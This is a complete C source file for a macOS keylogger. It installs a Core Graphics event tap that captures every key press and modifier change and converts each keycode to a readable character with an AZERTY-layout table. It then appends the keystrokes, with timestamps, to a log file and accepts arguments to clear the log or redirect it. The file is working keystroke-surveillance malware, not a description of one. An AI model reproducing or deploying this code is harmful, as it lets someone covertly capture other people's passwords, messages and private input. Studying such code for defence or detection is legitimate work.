#include "keylogger.h"

time_t last_time = 0;

int main(int argc, const char *argv[]) {

    // Create an event tap to retrieve keypresses.
    CGEventMask eventMask = (CGEventMaskBit(kCGEventKeyDown) | CGEventMaskBit(kCGEventFlagsChanged));
    CFMachPortRef eventTap = CGEventTapCreate(
        kCGSessionEventTap, kCGHeadInsertEventTap, 0, eventMask, CGEventCallback, NULL
    );

    // Exit the program if unable to create the event tap.
    if(!eventTap) {
        fprintf(stderr, "ERROR: Unable to create event tap.\n");
        exit(1);
    }

    // Create a run loop source and add enable the event tap.
    CFRunLoopSourceRef runLoopSource = CFMachPortCreateRunLoopSource(kCFAllocatorDefault, eventTap, 0);
    CFRunLoopAddSource(CFRunLoopGetCurrent(), runLoopSource, kCFRunLoopCommonModes);
    CGEventTapEnable(eventTap, true);


    // Clear the logfile if clear argument used or log to specific file if given.
    if(argc == 2) {
        if(strcmp(argv[1], "clear") == 0) {
            fopen(logfileLocation, "w");
            printf("%s cleared.\n", logfileLocation);
            fflush(stdout);
            exit(1);
        } else {
            logfileLocation = argv[1];
        }
    }

    // Get the current time and open the logfile.
    time_t result = time(NULL);
    logfile = fopen(logfileLocation, "a");
    
    if (!logfile) {
        fprintf(stderr, "ERROR: Unable to open log file. Ensure that you have the proper permissions.\n");
        exit(1);
    }

    // Output to logfile.
    fprintf(logfile, "\n\nKeylogging has begun.\n%s\n", asctime(localtime(&result)));
    fflush(logfile);

    // Display the location of the logfile and start the loop.
    printf("Logging to: %s\n", logfileLocation);
    fflush(stdout);
    CFRunLoopRun();

    return 0;
}

// The following callback method is invoked on every keypress.
CGEventRef CGEventCallback(CGEventTapProxy proxy, CGEventType type, CGEventRef event, void *refcon) {
    if (type != kCGEventKeyDown && type != kCGEventFlagsChanged && type != kCGEventKeyUp) { return event; }

    // Retrieve the incoming keycode.
    CGKeyCode keyCode = (CGKeyCode) CGEventGetIntegerValueField(event, kCGKeyboardEventKeycode);

    time_t curr_time = time(0);
    if (curr_time - last_time > 1) {
         fprintf(logfile, "\n");
    }       
    // Print the human readable key to the logfile.
    fprintf(logfile, "%s", convertKeyCode(keyCode));
    last_time = curr_time;
    fflush(logfile);

    return event;
}

// The following method converts the key code returned by each keypress as
// a human readable key code in const char format.
const char *convertKeyCode(int keyCode) {
    switch ((int) keyCode) {
        case 0:   return "q";
        case 1:   return "s";
        case 2:   return "d";
        case 3:   return "f";
        case 4:   return "h";
        case 5:   return "g";
        case 6:   return "w";
        case 7:   return "x";
        case 8:   return "c";
        case 9:   return "v";
        case 10:  return "@";
        case 11:  return "b";
        case 12:  return "a";
        case 13:  return "z";
        case 14:  return "e";
        case 15:  return "r";
        case 16:  return "y";
        case 17:  return "t";
        case 18:  return "1";
        case 19:  return "2";
        case 20:  return "3";
        case 21:  return "4";
        case 22:  return "6";
        case 23:  return "5";
        case 24:  return "-";
        case 25:  return "9";
        case 26:  return "7";
        case 27:  return ")";
        case 28:  return "8";
        case 29:  return "0";
        case 30:  return "$";
        case 31:  return "o";
        case 32:  return "u";
        case 33:  return "^";
        case 34:  return "i";
        case 35:  return "p";
        case 37:  return "l";
        case 38:  return "j";
        case 39:  return "ù";
        case 40:  return "k";
        case 41:  return "m";
        case 42:  return "";
        case 43:  return ";";
        case 44:  return "=";
        case 45:  return "n";
        case 46:  return ",";
        case 47:  return ":";
        case 50:  return "";
        case 65:  return "<Decimal>";
        case 67:  return "<Asterisk>";
        case 69:  return "<Plus>";
        case 71:  return "<Clear>";
        case 75:  return "<Divide>";
        case 76:  return "<Enter>";
        case 78:  return "<Hyphen>";
        case 81:  return "<Equals>";
        case 82:  return "0";
        case 83:  return "1";
        case 84:  return "2";
        case 85:  return "3";
        case 86:  return "4";
        case 87:  return "5";
        case 88:  return "6";
        case 89:  return "7";
        case 91:  return "8";
        case 92:  return "9";
        case 36:  return "<Return>";
        case 48:  return "<Tab>";
        case 49:  return " ";
        case 51:  return "<Del>";
        case 53:  return "<Esc>";
        case 55:  return "<Cmd>";
        case 56:  return "<Shift>";
        case 57:  return "<Caps>";
        case 58:  return "<Option>";
        case 59:  return "<Ctrl>";
        case 60:  return "<Shift>";
        case 61:  return "<Option>";
        case 62:  return "<Ctrl>";
        case 63:  return "<Fn>";
        case 64:  return "<F17>";
        case 72:  return "<Volup>";
        case 73:  return "<Voldown>";
        case 74:  return "<Mute>";
        case 79:  return "<F18>";
        case 80:  return "<F19>";
        case 90:  return "<F20>";
        case 96:  return "<F5>";
        case 97:  return "<F6>";
        case 98:  return "<F7>";
        case 99:  return "<F3>";
        case 100: return "<F8>";
        case 101: return "<F9>";
        case 103: return "<F11>";
        case 105: return "<F13>";
        case 106: return "<F16>";
        case 107: return "<F14>";
        case 109: return "<F10>";
        case 111: return "<F12>";
        case 113: return "<F15>";
        case 114: return "<Help>";
        case 115: return "<Home>";
        case 116: return "<PgUp>";
        case 117: return "<FwdDel>";
        case 118: return "<F4>";
        case 119: return "<End>";
        case 120: return "<F2>";
        case 121: return "<PgDown>";
        case 122: return "<F1>";
        case 123: return "<Left>";
        case 124: return "<Right>";
        case 125: return "<Down>";
        case 126: return "<Up>";
    }
    return "<unknown>";
}
